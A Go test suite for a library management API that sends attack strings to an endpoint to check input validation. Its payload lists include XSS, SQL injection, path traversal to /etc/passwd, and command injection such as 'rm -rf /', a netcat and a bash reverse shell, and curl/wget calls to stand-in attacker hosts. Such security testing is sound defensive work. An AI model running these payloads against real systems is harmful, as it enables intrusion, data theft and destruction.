package tests

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/gin-gonic/gin"
	"github.com/ngenohkevin/lms/internal/database/queries"
	"github.com/ngenohkevin/lms/internal/handlers"
	"github.com/ngenohkevin/lms/internal/middleware"
	"github.com/ngenohkevin/lms/internal/models"
	"github.com/ngenohkevin/lms/internal/services"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"github.com/stretchr/testify/suite"
)

// InputValidationSecurityTestSuite tests input validation security
type InputValidationSecurityTestSuite struct {
	suite.Suite
	router      *gin.Engine
	authService *services.AuthService
	bookService *services.BookService
	userService *services.UserService
	testDB      *queries.Queries
	cleanup     func()
}

func (suite *InputValidationSecurityTestSuite) SetupSuite() {
	gin.SetMode(gin.TestMode)

	// Setup test environment
	testDB, pool, testRedis, cleanup := setupTestEnvironmentWithPool()
	if testDB == nil {
		suite.T().Skip("Database not configured, skipping integration tests")
		return
	}
	suite.testDB = testDB
	suite.cleanup = cleanup

	// Create services
	authService, err := createTestAuthService(testRedis)
	require.NoError(suite.T(), err)
	suite.authService = authService

	// Create cache service
	cacheService := services.NewCacheService(testRedis)

	suite.bookService = services.NewBookService(testDB, cacheService)
	suite.userService = services.NewUserService(pool, testLogger)

	// Setup router
	suite.setupRouter()
}

func (suite *InputValidationSecurityTestSuite) TearDownSuite() {
	if suite.cleanup != nil {
		suite.cleanup()
	}
}

func (suite *InputValidationSecurityTestSuite) setupRouter() {
	router := gin.New()
	router.Use(gin.Recovery())

	// Add security middleware
	securityConfig := middleware.DefaultSecurityConfig()
	router.Use(middleware.SecurityHeaders(securityConfig))
	router.Use(middleware.AdvancedSecurityMiddleware(securityConfig))

	// Create handlers
	// Create email service (use mock for tests)
	emailService := &mockEmailService{}

	// For security tests, we don't need the full functionality, use nil for additional services
	bookHandler := handlers.NewBookHandler(suite.bookService, nil, nil)
	authHandler := handlers.NewAuthHandler(suite.authService, suite.userService, emailService, nil)

	// Routes
	router.POST("/api/v1/auth/login", authHandler.Login)
	authMiddleware := createSimpleTestAuthMiddleware(suite.authService)
	router.POST("/api/v1/books", authMiddleware.RequireAuth(), bookHandler.CreateBook)
	router.GET("/api/v1/books", bookHandler.ListBooks)
	router.PUT("/api/v1/books/:id", authMiddleware.RequireAuth(), bookHandler.UpdateBook)

	// Test endpoints for validation
	router.POST("/api/v1/test/data", authMiddleware.RequireAuth(), suite.testDataHandler)

	suite.router = router
}

func (suite *InputValidationSecurityTestSuite) testDataHandler(c *gin.Context) {
	// Validate content type for JSON endpoints
	contentType := c.GetHeader("Content-Type")
	if !strings.HasPrefix(contentType, "application/json") {
		c.JSON(http.StatusUnsupportedMediaType, gin.H{"error": "Content-Type must be application/json"})
		return
	}

	var data map[string]interface{}
	if err := c.ShouldBindJSON(&data); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid JSON", "details": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"received": data, "status": "processed"})
}

// Test: XSS (Cross-Site Scripting) Prevention
func (suite *InputValidationSecurityTestSuite) TestXSSPrevention() {
	suite.Run("HTML script tags should be handled safely", func() {
		xssPayloads := []string{
			`<script>alert('xss')</script>`,
			`<script src="http://evil.com/xss.js"></script>`,
			`<img src=x onerror=alert('xss')>`,
			`<svg onload=alert('xss')>`,
			`<iframe src="javascript:alert('xss')"></iframe>`,
			`<body onload=alert('xss')>`,
			`javascript:alert('xss')`,
			`<img src="javascript:alert('xss')">`,
			`"><script>alert('xss')</script>`,
			`';alert('xss');//`,
		}

		validToken := suite.getValidToken()

		for _, payload := range xssPayloads {
			testData := map[string]interface{}{
				"name":        payload,
				"description": payload,
				"content":     payload,
			}

			body, _ := json.Marshal(testData)
			w := httptest.NewRecorder()
			req, _ := http.NewRequest("POST", "/api/v1/test/data", bytes.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			req.Header.Set("Authorization", "Bearer "+validToken)
			req.Header.Set("User-Agent", "Test-Agent/1.0")

			suite.router.ServeHTTP(w, req)

			// Should not crash the server
			assert.NotEqual(suite.T(), http.StatusInternalServerError, w.Code,
				"XSS payload should not crash server: %s", payload)

			// Response should not contain unescaped script tags
			responseBody := w.Body.String()
			assert.NotContains(suite.T(), responseBody, "<script>",
				"Response should not contain unescaped script tags for payload: %s", payload)
		}
	})

	suite.Run("JavaScript protocol URLs should be sanitized", func() {
		javascriptURLs := []string{
			`javascript:alert('xss')`,
			`JAVASCRIPT:alert('xss')`,
			`jaVaScRiPt:alert('xss')`,
			`&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('xss')`,
			`data:text/html,<script>alert('xss')</script>`,
		}

		validToken := suite.getValidToken()

		for _, url := range javascriptURLs {
			testData := map[string]interface{}{
				"url":  url,
				"link": url,
			}

			body, _ := json.Marshal(testData)
			w := httptest.NewRecorder()
			req, _ := http.NewRequest("POST", "/api/v1/test/data", bytes.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			req.Header.Set("Authorization", "Bearer "+validToken)
			req.Header.Set("User-Agent", "Test-Agent/1.0")

			suite.router.ServeHTTP(w, req)

			// Should handle malicious URLs safely
			assert.NotEqual(suite.T(), http.StatusInternalServerError, w.Code,
				"JavaScript URL should be handled safely: %s", url)
		}
	})
}

// Test: Command Injection Prevention
func (suite *InputValidationSecurityTestSuite) TestCommandInjectionPrevention() {
	suite.Run("Command injection payloads should be handled safely", func() {
		commandPayloads := []string{
			`; rm -rf /`,
			`| cat /etc/passwd`,
			`&& whoami`,
			`$(rm -rf /)`,
			"`cat /etc/passwd`",
			`; nc -e /bin/sh attacker.com 1234`,
			`| python -c "import os; os.system('rm -rf /')"`,
			`&& curl http://attacker.com/steal-data`,
			`; wget http://evil.com/malware`,
			`| bash -i >& /dev/tcp/attacker.com/8080 0>&1`,
		}

		validToken := suite.getValidToken()

		for _, payload := range commandPayloads {
			testData := map[string]interface{}{
				"filename": payload,
				"path":     payload,
				"command":  payload,
			}

			body, _ := json.Marshal(testData)
			w := httptest.NewRecorder()
			req, _ := http.NewRequest("POST", "/api/v1/test/data", bytes.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			req.Header.Set("Authorization", "Bearer "+validToken)
			req.Header.Set("User-Agent", "Test-Agent/1.0")

			suite.router.ServeHTTP(w, req)

			// Should not execute commands or crash server
			assert.NotEqual(suite.T(), http.StatusInternalServerError, w.Code,
				"Command injection should not crash server: %s", payload)
		}
	})
}

// Test: Path Traversal Prevention
func (suite *InputValidationSecurityTestSuite) TestPathTraversalPrevention() {
	suite.Run("Path traversal attacks should be prevented", func() {
		pathTraversalPayloads := []string{
			`../../../etc/passwd`,
			`..\\..\\..\\windows\\system32\\config\\sam`,
			`....//....//....//etc/passwd`,
			`..%2F..%2F..%2Fetc%2Fpasswd`,
			`%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`,
			`..%c0%afetc%c0%afpasswd`,
			`..%252f..%252f..%252fetc%252fpasswd`,
			`/etc/passwd%00.jpg`,
			`....\/....\/....\/etc/passwd`,
			`..\\..\\..\\/etc/passwd`,
		}

		validToken := suite.getValidToken()

		for _, payload := range pathTraversalPayloads {
			testData := map[string]interface{}{
				"file":     payload,
				"path":     payload,
				"filename": payload,
				"upload":   payload,
			}

			body, _ := json.Marshal(testData)
			w := httptest.NewRecorder()
			req, _ := http.NewRequest("POST", "/api/v1/test/data", bytes.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			req.Header.Set("Authorization", "Bearer "+validToken)
			req.Header.Set("User-Agent", "Test-Agent/1.0")

			suite.router.ServeHTTP(w, req)

			// Should handle path traversal attempts safely
			assert.NotEqual(suite.T(), http.StatusInternalServerError, w.Code,
				"Path traversal should be handled safely: %s", payload)
		}
	})
}

// Test: JSON Injection and Parsing Bombs
func (suite *InputValidationSecurityTestSuite) TestJSONSecurityIssues() {
	suite.Run("Deeply nested JSON should be handled safely", func() {
		// Create deeply nested JSON
		deepNesting := strings.Repeat(`{"level":`, 10000) + `"value"` + strings.Repeat(`}`, 10000)

		w := httptest.NewRecorder()
		req, _ := http.NewRequest("POST", "/api/v1/test/data", strings.NewReader(deepNesting))
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("Authorization", "Bearer "+suite.getValidToken())
		req.Header.Set("User-Agent", "Test-Agent/1.0")

		suite.router.ServeHTTP(w, req)

		// Should not crash the server or consume excessive memory
		assert.NotEqual(suite.T(), http.StatusInternalServerError, w.Code,
			"Deeply nested JSON should not crash server")
	})

	suite.Run("Large JSON arrays should be handled safely", func() {
		// Create large array
		largeArray := make([]string, 100000)
		for i := range largeArray {
			largeArray[i] = "item" + string(rune(i))
		}

		testData := map[string]interface{}{
			"items": largeArray,
		}

		body, _ := json.Marshal(testData)
		w := httptest.NewRecorder()
		req, _ := http.NewRequest("POST", "/api/v1/test/data", bytes.NewReader(body))
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("Authorization", "Bearer "+suite.getValidToken())
		req.Header.Set("User-Agent", "Test-Agent/1.0")

		suite.router.ServeHTTP(w, req)

		// Should handle large arrays safely
		assert.NotEqual(suite.T(), http.StatusInternalServerError, w.Code,
			"Large JSON array should be handled safely")
	})

	suite.Run("Malformed JSON should be rejected properly", func() {
		malformedJSONs := []string{
			`{"key": }`,
			`{"key": "value",}`,
			`{key: "value"}`,
			`{"key": "value" "another": "value"}`,
			`[1, 2, 3,]`,
			`{"incomplete":`,
			`}invalid{`,
			`"just a string"`,
		}

		for _, malformed := range malformedJSONs {
			w := httptest.NewRecorder()
			req, _ := http.NewRequest("POST", "/api/v1/test/data", strings.NewReader(malformed))
			req.Header.Set("Content-Type", "application/json")
			req.Header.Set("Authorization", "Bearer "+suite.getValidToken())
			req.Header.Set("User-Agent", "Test-Agent/1.0")

			suite.router.ServeHTTP(w, req)

			// Should return bad request, not internal server error
			assert.Equal(suite.T(), http.StatusBadRequest, w.Code,
				"Malformed JSON should return bad request: %s", malformed)

			// Should not leak internal error information
			responseBody := w.Body.String()
			assert.NotContains(suite.T(), responseBody, "runtime.",
				"Error response should not contain runtime information")
		}
	})
}

// Test: Content-Type validation
func (suite *InputValidationSecurityTestSuite) TestContentTypeValidation() {
	suite.Run("Wrong content type should be rejected", func() {
		validData := `{"name": "test", "value": "data"}`
		wrongContentTypes := []string{
			"text/plain",
			"text/html",
			"application/xml",
			"multipart/form-data",
			"application/x-www-form-urlencoded",
			"",
		}

		for _, contentType := range wrongContentTypes {
			w := httptest.NewRecorder()
			req, _ := http.NewRequest("POST", "/api/v1/test/data", strings.NewReader(validData))
			if contentType != "" {
				req.Header.Set("Content-Type", contentType)
			}
			req.Header.Set("Authorization", "Bearer "+suite.getValidToken())
			req.Header.Set("User-Agent", "Test-Agent/1.0")

			suite.router.ServeHTTP(w, req)

			// Should reject wrong content type
			assert.NotEqual(suite.T(), http.StatusOK, w.Code,
				"Wrong content type should be rejected: %s", contentType)
		}
	})
}

// Test: Input size limits
func (suite *InputValidationSecurityTestSuite) TestInputSizeLimits() {
	suite.Run("Oversized requests should be rejected", func() {
		// Create large string (over typical limits)
		largeString := strings.Repeat("A", 50*1024*1024) // 50MB

		testData := map[string]interface{}{
			"data": largeString,
		}

		body, _ := json.Marshal(testData)
		w := httptest.NewRecorder()
		req, _ := http.NewRequest("POST", "/api/v1/test/data", bytes.NewReader(body))
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("Authorization", "Bearer "+suite.getValidToken())
		req.Header.Set("User-Agent", "Test-Agent/1.0")

		suite.router.ServeHTTP(w, req)

		// Should reject oversized request
		assert.Equal(suite.T(), http.StatusRequestEntityTooLarge, w.Code,
			"Oversized request should be rejected")
	})
}

// Test: Special character handling
func (suite *InputValidationSecurityTestSuite) TestSpecialCharacterHandling() {
	suite.Run("Unicode and special characters should be handled safely", func() {
		specialChars := []string{
			"\x00\x01\x02\x03\x04",     // Control characters
			"🚀🌟💻🔒🛡️",                   // Emojis
			"αβγδεζηθικλμνξοπρστυφχψω", // Greek letters
			"中文测试データ",                  // Mixed Asian characters
			"\uFEFF\u200B\u200C\u200D", // Zero-width characters
			"\"'`\\{}[]()<>",           // Special punctuation
			"\r\n\t\v\f",               // Whitespace characters
		}

		validToken := suite.getValidToken()

		for _, chars := range specialChars {
			testData := map[string]interface{}{
				"text":    chars,
				"content": chars,
			}

			body, _ := json.Marshal(testData)
			w := httptest.NewRecorder()
			req, _ := http.NewRequest("POST", "/api/v1/test/data", bytes.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			req.Header.Set("Authorization", "Bearer "+validToken)
			req.Header.Set("User-Agent", "Test-Agent/1.0")

			suite.router.ServeHTTP(w, req)

			// Should handle special characters without crashing
			assert.NotEqual(suite.T(), http.StatusInternalServerError, w.Code,
				"Special characters should be handled safely: %v", []byte(chars))
		}
	})
}

// Test: SQL injection attempts through JSON
func (suite *InputValidationSecurityTestSuite) TestSQLInjectionThroughJSON() {
	suite.Run("SQL injection payloads in JSON should be safe", func() {
		sqlPayloads := []string{
			`' OR '1'='1`,
			`'; DROP TABLE users; --`,
			`' UNION SELECT * FROM passwords --`,
			`admin'; INSERT INTO users VALUES ('hacker'); --`,
			`' AND 1=1 --`,
			`' OR 1=1 /*`,
			`' EXEC xp_cmdshell('dir') --`,
			`1' OR '1'='1' /*`,
		}

		validToken := suite.getValidToken()

		for _, payload := range sqlPayloads {
			testData := map[string]interface{}{
				"username":   payload,
				"search":     payload,
				"filter":     payload,
				"book_id":    payload,
				"student_id": payload,
			}

			body, _ := json.Marshal(testData)
			w := httptest.NewRecorder()
			req, _ := http.NewRequest("POST", "/api/v1/test/data", bytes.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			req.Header.Set("Authorization", "Bearer "+validToken)
			req.Header.Set("User-Agent", "Test-Agent/1.0")

			suite.router.ServeHTTP(w, req)

			// Should handle SQL injection attempts safely
			assert.NotEqual(suite.T(), http.StatusInternalServerError, w.Code,
				"SQL injection payload should be handled safely: %s", payload)
		}
	})
}

// Helper methods
func (suite *InputValidationSecurityTestSuite) getValidToken() string {
	// Create test user and login
	loginData := map[string]string{
		"username": "admin",
		"password": "admin123",
	}

	body, _ := json.Marshal(loginData)
	w := httptest.NewRecorder()
	req, _ := http.NewRequest("POST", "/api/v1/auth/login", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Test-Agent/1.0")

	suite.router.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		// Return a mock valid token for testing
		user := &models.User{
			ID:       1,
			Username: "testuser",
			Role:     models.UserRole("admin"),
		}
		token, _, _ := suite.authService.GenerateTokens(user, "librarian")
		return token
	}

	var response map[string]interface{}
	_ = json.Unmarshal(w.Body.Bytes(), &response)

	return response["access_token"].(string)
}

func TestInputValidationSecurityTestSuite(t *testing.T) {
	suite.Run(t, new(InputValidationSecurityTestSuite))
}
